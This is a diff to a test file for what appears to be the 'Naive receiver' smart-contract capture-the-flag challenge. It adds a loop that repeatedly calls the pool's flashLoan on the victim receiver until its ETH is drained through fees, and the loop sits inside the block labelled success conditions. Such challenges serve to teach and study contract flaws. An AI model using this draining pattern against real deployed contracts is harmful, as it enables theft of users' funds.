@@ -35,6 +35,9 @@ describe('[Challenge] Naive receiver', function () {
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        while (await ethers.provider.getBalance(this.receiver.address) > 0) {
+            await this.pool.flashLoan(this.receiver.address, 0);
+        }
 
         // All ETH has been drained from the receiver
         expect(
